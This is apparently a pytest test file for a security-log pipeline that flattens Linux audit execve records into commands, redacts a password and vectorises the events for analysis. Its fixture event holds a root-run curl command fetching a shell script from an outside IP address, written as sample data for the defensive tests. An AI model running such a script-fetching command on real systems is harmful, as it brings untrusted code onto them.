import json

import numpy as np

from src.features import INPUT_DIM, LogVectorizer, flatten_audit_execve, read_command
from src.sanitizer import ISOSanitizer


def _audit_event(**overrides: object) -> str:
    audit = {
        "type": "SYSCALL",
        "syscall": "59",
        "auid": "1000",
        "euid": "0",
        "tty": "pts0",
        "exe": "/usr/bin/curl",
        "cwd": "/home/admin",
        "key": "audit-wazuh-c",
        "execve": {"a0": "curl", "a1": "-s", "a2": "http://203.0.113.9/x.sh"},
    }
    audit.update(overrides)
    return json.dumps({
        "timestamp": "2026-11-09T10:00:00.000+0000",
        "agent": {"id": "023", "name": "host"},
        "location": "/var/log/audit/audit.log",
        "data": {"audit": audit},
    })


def test_flatten_rebuilds_a_full_path_command_from_execve() -> None:
    data = json.loads(_audit_event())["data"]

    flat = flatten_audit_execve(data)

    assert flat["command"] == "/usr/bin/curl -s http://203.0.113.9/x.sh"
    assert flat["exe"] == "/usr/bin/curl"
    assert flat["srcuser"] == "uid:1000"
    assert flat["dstuser"] == "uid:0"
    assert flat["cwd"] == "/home/admin"
    assert flat["tty"] == "pts0"


def test_flatten_orders_arguments_numerically() -> None:
    execve = {f"a{i}": str(i) for i in range(12)}
    data = json.loads(_audit_event(execve=execve, exe="/bin/echo"))["data"]

    assert read_command(flatten_audit_execve(data)) == "/bin/echo " + " ".join(map(str, range(1, 12)))


def test_flatten_drops_the_no_terminal_marker() -> None:
    data = json.loads(_audit_event(tty="(none)"))["data"]

    assert "tty" not in flatten_audit_execve(data)


def test_flatten_leaves_non_execve_audit_records_alone() -> None:
    data = {"audit": {"type": "PATH", "exe": "/usr/bin/cat"}}

    assert flatten_audit_execve(data) is data


def test_audit_events_are_ignored_unless_enabled() -> None:
    assert ISOSanitizer().process_event(_audit_event()) is None


def test_enabled_audit_events_are_sanitized_and_vectorized() -> None:
    execve = {"a0": "mysql", "a1": "--password=hunter2"}
    raw = _audit_event(execve=execve, exe="/usr/bin/mysql")

    event = ISOSanitizer(include_audit_execve=True).process_event(raw)

    assert event is not None
    assert "hunter2" not in event["data"]["command"]
    vector = LogVectorizer().extract_vector(event)
    assert vector.shape == (INPUT_DIM,) and vector.dtype == np.float32
